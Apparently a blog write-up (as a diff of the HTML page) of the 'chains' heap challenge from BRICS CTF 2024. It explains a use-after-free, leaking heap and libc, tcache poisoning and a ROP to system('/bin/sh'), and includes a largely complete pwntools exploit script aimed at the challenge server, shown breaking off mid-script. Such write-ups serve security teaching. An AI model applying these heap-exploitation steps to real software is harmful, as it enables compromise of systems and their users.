@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  chains - BRICS CTF 2024 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Using proxy chains to pwn the remote server">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="chains - BRICS CTF 2024">
+	<meta name="twitter:description" content="Using proxy chains to pwn the remote server">
+
+<meta property="og:url" content="http://localhost:1313/posts/brics_chains/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="chains - BRICS CTF 2024">
+	<meta property="og:description" content="Using proxy chains to pwn the remote server">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2024-10-18T18:50:53+02:00">
+		<meta property="article:modified_time" content="2024-10-18T18:50:53+02:00">
+		<meta property="article:tag" content="Heap">
+		<meta property="article:tag" content="Glibc">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/brics_chains/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/brics_chains/">
+              chains - BRICS CTF 2024
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-10-18T18:50:53&#43;02:00">
+                October 18, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/heap/">Heap</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/glibc/">Glibc</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <p>Two weeks ago, I played BRICS CTF with r3kapig, and we ranked 1st!
+Chains was one of the challanges I solved.</p>
+<p>We were given a program to add/remove proxies and chains. Upon executing we&rsquo;re presented with:</p>
+<pre tabindex="0"><code>1. Add Proxy
+2. Delete Proxy
+3. Add Chain
+4. View Chain
+5. Delete Chain
+6. Exit
+</code></pre><p>That resembles a typical heap challenge. It turns out to be one,
+since the following structures are getting allocated dynamically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> _proxy {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span><span style="color:#ff7b72;font-weight:bold">*</span> hostname;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int16_t</span> port;
+</span></span><span style="display:flex;"><span>} <span style="color:#ff7b72">proxy_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> _chain {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">proxy_t</span><span style="color:#ff7b72;font-weight:bold">*</span> proxy;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">struct</span> _chain<span style="color:#ff7b72;font-weight:bold">*</span> next;
+</span></span><span style="display:flex;"><span>} <span style="color:#ff7b72">chain_t</span>;
+</span></span></code></pre></div><p>Allocating user input is restricted to the <code>hostname</code> buffer, which is limited in size (128 bytes).
+An interesting functionality is, that we can attach proxies to a <code>chain_t</code> of length <code>n</code>.
+This stores a reference to a <code>proxy_t</code> object into the <code>proxy</code> member.</p>
+<p>Here comes the problem. We can free proxies individually, however their references from chains
+are not cleared. Freeing a chain would also try to free the associated proxies, so we can
+achieve a use-after-free. This works vice-versa</p>
+<p>To leak heap, we can free a proxy object via the <code>delete_chain</code> function, and due to it&rsquo;s reference not being cleared in <code>proxies</code> array, we can add the free&rsquo;d proxy to a chain again. This allows us
+to receive a heap leak:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;BBBB&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;CCCC&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">1</span>])
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># 1 is deleted</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">2</span>, [<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">2</span>])
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">2</span>, [<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">2</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># leak</span>
+</span></span></code></pre></div><p>Now how do we continue from here? We have a modern libc version (<code>2.39-0ubuntu8.3</code>) plus we cannot
+fully control chunks in terms of size and data. That&rsquo;s why I constructed an arbitrary free / read.</p>
+<p>For that I used some sort of type confusion. If we overlap a free&rsquo;d <code>chain_t</code> with <code>proxy_t</code>, our
+data in <code>hostname</code> gets interpreted as a <code>proxy_t</code> object, and our <code>port</code> as <code>next</code> pointer.
+We can fully craft a fake and controlled <code>proxy_t</code> object now.
+When doing a view or delete our the already free <code>chain_t</code> pointer, it tries to ouput or free
+the <code>hostname</code> property of our fake object, so we can control the location entirely!</p>
+<p>To get a libc leak then, I crafted a fake unsorted chunk, free&rsquo;d it using the arb free to then read
+the libc address of <code>main_arena</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;DDDD&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 3</span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;EEEE&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">3</span>])
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">4</span>])
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">4</span>]) <span style="color:#8b949e;font-style:italic"># 3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>add_proxy(p64(unsorted_ptr)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x3</span><span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x421</span>)<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;ZZZZZZZZ&#34;</span>, <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">4</span>):
+</span></span><span style="display:flex;"><span>    add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x20</span><span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x61</span>), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># free chain 0</span>
+</span></span><span style="display:flex;"><span>add_proxy(p64(unsorted_ptr), <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">0</span>)
+</span></span></code></pre></div><p>Because the libc version is new, I decided to overwrite return address on the stack. Luckily we
+can re-use our arb read technique we used for libc leak to get a stack leak from <code>environ</code>.</p>
+<p>To write to the stack, I just overlapped some tcache chunks and did some tcache poisioning.
+All that was left to do is to rop to <code>system(&quot;/bin/sh&quot;)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">add_proxy</span>(hostname, port):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;hostname:&#34;</span>, hostname)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;port:&#34;</span>, str(port)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">delete_proxy</span>(id):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;id:&#34;</span>, str(id)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">add_chain</span>(sz, ids):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">assert</span> sz <span style="color:#ff7b72;font-weight:bold">==</span> len(ids)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;size:&#34;</span>, str(sz)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> id <span style="color:#ff7b72;font-weight:bold">in</span> ids:
+</span></span><span style="display:flex;"><span>        p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;id:&#34;</span>, str(id)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">view_chain</span>(id):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;id:&#34;</span>, str(id)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">delete_chain</span>(id):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;id:&#34;</span>, str(id)<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">mask</span>(heap_base,target):
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">return</span> (heap_base <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">0xc</span> ) <span style="color:#ff7b72;font-weight:bold">^</span> target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#p = process(&#34;./chains&#34;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&#34;89.169.156.185&#34;</span>, <span style="color:#a5d6ff">13905</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;AAAA&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;BBBB&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;CCCC&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">1</span>])
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># 1 is deleted</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">2</span>, [<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">2</span>])
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">2</span>, [<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">2</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34; is &#34;</span>)
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">6</span>)<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>secret_addr <span style="color:#ff7b72;font-weight:bold">=</span> heap_leak <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x18</span>
+</span></span><span style="display:flex;"><span>unsorted_ptr <span style="color:#ff7b72;font-weight:bold">=</span> heap_leak <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x120</span>
+</span></span><span style="display:flex;"><span>overlap_ptr <span style="color:#ff7b72;font-weight:bold">=</span> heap_leak <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0xaf0</span>
+</span></span><span style="display:flex;"><span>mask_ptr <span style="color:#ff7b72;font-weight:bold">=</span> heap_leak <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0xb40</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;heap_leak: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> hex(heap_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">proxy chunk 1 is read
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">proxy chunk 3 is free
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># free chain 0</span>
+</span></span><span style="display:flex;"><span>add_proxy(p64(secret_addr), <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;proxy #1 is &#34;</span>)
+</span></span><span style="display:flex;"><span>secret <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">8</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;heap secret: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> hex(secret))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;DDDD&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 3</span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;EEEE&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">3</span>])
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">4</span>])
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">4</span>]) <span style="color:#8b949e;font-style:italic"># 3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>add_proxy(p64(unsorted_ptr)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x3</span><span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x421</span>)<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;ZZZZZZZZ&#34;</span>, <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">4</span>):
+</span></span><span style="display:flex;"><span>    add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x20</span><span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x0</span>)<span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0x61</span>), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># free chain 0</span>
+</span></span><span style="display:flex;"><span>add_proxy(p64(unsorted_ptr), <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;proxy #1 is &#34;</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">6</span>)<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> libc_leak <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x203b20</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x58740</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1cb42f</span>
+</span></span><span style="display:flex;"><span>environ <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x20ad58</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x10f75b</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x2882f</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;libc_base: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> hex(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># free chain 0</span>
+</span></span><span style="display:flex;"><span>add_proxy(p64(environ), <span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>view_chain(<span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;proxy #1 is &#34;</span>)
